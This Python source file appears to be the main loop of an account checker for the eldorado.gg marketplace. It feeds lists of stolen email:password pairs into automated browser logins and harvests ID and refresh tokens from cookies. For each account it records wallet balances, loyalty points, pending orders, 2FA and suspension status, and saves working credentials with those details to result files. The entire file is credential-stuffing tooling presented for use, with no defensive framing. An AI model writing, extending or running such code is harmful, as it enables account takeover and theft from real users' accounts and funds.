import time
import json

from core.accounts import (
    accounts_to_json,
    save_clean_account,
    save_suspended_account,
)
from core.browser import (
    build_login_script,
    get_all_cookies_via_cdp,
    do_authenticate,
    do_logout,
    do_offer_user_me,
    do_loyalty_me,
    do_pending_orders_sum,
    do_users_me,
    do_user_payment,
)


def run(page, raw_accounts: list, target_url: str):
    """Main scanning loop."""
    total = len(raw_accounts)
    accounts_json = accounts_to_json(raw_accounts)
    current_index = 0

    while current_index < total:
        try:
            script = build_login_script(accounts_json, current_index)

            page.run_js(
                "window._need_refresh = false;"
                "window._script_finished = false;"
                "window._log_queue = [];"
                "window._verify_request_sent = false;"
                "window._auth_code = null;"
                "window._code_verifier = null;"
                "window._wait_for_cookie_read = false;"
                "window._last_success = null;"
                "window._logger_initialized = false;"
            )
            page.run_js(script)

            start_time = time.time()
            while time.time() - start_time < 15:
                time.sleep(0.1)
                try:
                    # --- Drain log queue ---
                    log_queue = page.run_js("let q = window._log_queue || []; window._log_queue = []; return q;")
                    if log_queue:
                        for item in log_queue:
                            parsed = json.loads(item)
                            print(parsed["text"])

                    # --- Successful login signal ---
                    if page.run_js("return window._wait_for_cookie_read || false;"):
                        page.run_js("window._wait_for_cookie_read = false;")
                        time.sleep(0.3)

                        auth_code     = page.run_js("return window._auth_code || null;")
                        code_verifier = page.run_js("return window._code_verifier || null;")

                        if auth_code and code_verifier:
                            # Get email:password directly from the accounts list — no JS needed
                            raw_line = raw_accounts[current_index]
                            colon = raw_line.index(":")
                            saved_email    = raw_line[:colon]
                            saved_password = raw_line[colon + 1:]

                            # Navigate to auth-callback
                            callback_url = (
                                f"https://www.eldorado.gg/account/auth-callback"
                                f"?code={auth_code}&state=XbANFvjOIGeUrUsY7d4WXUpJ5f8E1CPV"
                            )
                            page.get(callback_url)
                            time.sleep(3)

                            # Authenticate
                            auth_result = do_authenticate(page, auth_code, code_verifier)
                            if auth_result.get("status") != 200:
                                print(f"[AUTH ERROR] Status: {auth_result.get('status')} | {auth_result.get('error', '')}")

                            # Grab tokens from CDP
                            time.sleep(0.5)
                            www_cookies = get_all_cookies_via_cdp(page, "eldorado.gg")
                            id_token = refresh_token = None
                            for c in www_cookies:
                                if "EldoradoIdToken" in c["name"]:
                                    id_token = c["value"]
                                if "EldoradoRefreshToken" in c["name"]:
                                    refresh_token = c["value"]

                            # /api/userpayment/me
                            payment_result = do_user_payment(page)
                            balance_amount = balance_currency = "?"
                            balance_usd = "?"
                            if payment_result.get("body"):
                                dto = payment_result["body"].get("userPaymentPrivateDTO", {})
                                bal = dto.get("balance", {})
                                bal_usd = dto.get("balanceInUSD", {})
                                balance_amount   = bal.get("amount", "?")
                                balance_currency = bal.get("currency", "?")
                                balance_usd      = bal_usd.get("amount", "?")
                            print(f"[WALLET] Balance: {balance_amount} {balance_currency} ({balance_usd} USD)")

                            # /api/offerUser/me
                            me_result = do_offer_user_me(page)
                            offline = gift_seller = "?"
                            if me_result.get("body"):
                                b = me_result["body"]
                                offline     = b.get("offlineMode", "?")
                                gift_seller = b.get("isVerifiedGiftCardSeller", "?")
                            print(f"[LISTING] Online Mode: {offline} | Verified Gift Card Seller: {gift_seller}")

                            # /api/loyalty/me
                            loyalty_result = do_loyalty_me(page)
                            tier = points_balance = total_points = "?"
                            if loyalty_result.get("body"):
                                b = loyalty_result["body"]
                                tier           = b.get("tier", "?")
                                points_balance = b.get("pointsInBalance", "?")
                                total_points   = b.get("totalPoints", "?")
                            print(f"[LOYALTY] Tier: {tier} | Balance Points: {points_balance} | Total Points: {total_points}")

                            # /api/orders/me/pendingOrdersSum
                            orders_result = do_pending_orders_sum(page)
                            amount = currency = "?"
                            if orders_result.get("body"):
                                b        = orders_result["body"]
                                amount   = b.get("amount", "?")
                                currency = b.get("currency", "?")
                            print(f"[ORDERS] Pending Orders Total: {amount} {currency}")

                            # /api/users/me — suspension check
                            users_result = do_users_me(page)
                            suspended = False
                            is_2fa = is_verified = False
                            username = "?"
                            created_date = ban_type = ban_date = ban_reasons = custom_reason = "?"
                            email    = saved_email
                            password = saved_password

                            if users_result.get("body"):
                                b            = users_result["body"]
                                suspension   = b.get("suspension")
                                email        = b.get("email", email)
                                username     = b.get("username", "?")
                                is_2fa       = b.get("is2FAEnabled", False)
                                is_verified  = b.get("isVerifiedSeller", False)
                                created_date = (b.get("createdDate") or "?")[:10]

                                print(f"[ACCOUNT] Email: {email} | Username: {username}")
                                print(f"[ACCOUNT] Registered: {created_date} | 2FA: {is_2fa} | Verified Seller: {is_verified}")

                                if suspension:
                                    suspended    = True
                                    ban_type     = suspension.get("type", "?")
                                    ban_date     = (suspension.get("suspendedUntil") or "?")[:10]
                                    ban_reasons  = ", ".join(suspension.get("reasons") or [])
                                    custom_reason = suspension.get("customReason") or "-"
                                    print(f"[ACCOUNT] ⛔ SUSPENDED | Type: {ban_type} | Date: {ban_date} | Reason: {ban_reasons} | Custom: {custom_reason}")
                                else:
                                    print(f"[ACCOUNT] ✅ Account is not suspended")

                            # --- Save to result files ---
                            save_line = (
                                f"{email}:{password} | "
                                f"Username: {username} | "
                                f"Registered: {created_date} | "
                                f"2FA: {is_2fa} | "
                                f"Verified Seller: {is_verified} | "
                                f"Tier: {tier} | "
                                f"Balance Points: {points_balance} | "
                                f"Wallet: {balance_amount} {balance_currency} ({balance_usd} USD) | "
                                f"Pending Orders: {amount} {currency} | "
                                f"Online Mode: {offline}"
                            )

                            if suspended:
                                save_line += (
                                    f" | SUSPENDED | Type: {ban_type} | "
                                    f"Date: {ban_date} | Reason: {ban_reasons}"
                                )
                                save_suspended_account(save_line)
                                print(f"[SAVED] -> results_suspended.txt")
                            else:
                                save_clean_account(save_line)
                                print(f"[SAVED] -> results_clean.txt")

                        else:
                            print("[ERROR] Could not retrieve auth_code or code_verifier")

                        # Logout
                        do_logout(page)
                        time.sleep(0.3)
                        page.run_js("window._need_refresh = true;")

                    # --- Clear success flag (already saved above) ---
                    page.run_js("window._last_success = null;")

                    # --- Loop exit ---
                    if page.run_js("return window._need_refresh || false;"):
                        break

                except Exception:
                    pass

            current_index += 1

            if current_index % 200 == 0:
                try:
                    page.clear_cache(ignore_cookies=False)
                except:
                    pass

            page.get(target_url)
            time.sleep(1)

        except Exception as e:
            print(f"[SYSTEM ERROR] Loop error: {e}, skipping to next account.")
            current_index += 1
            try:
                page.get(target_url)
            except:
                pass
            time.sleep(1)

    print("\n[DONE] All accounts have been scanned.")
